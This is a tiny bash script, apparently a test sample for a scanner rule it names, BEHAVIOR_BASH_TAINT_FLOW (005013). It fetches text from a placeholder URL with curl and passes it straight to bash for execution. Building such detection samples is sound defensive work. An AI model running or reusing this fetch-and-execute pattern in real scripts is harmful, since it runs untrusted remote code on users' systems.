#!/bin/bash
# This script reads input from the network (curl) and passes it directly
# to bash for execution — an unsafe taint flow that triggers BEHAVIOR_BASH_TAINT_FLOW (005013).

PAYLOAD=$(curl -s http://example.com/commands)
bash -c "$PAYLOAD"
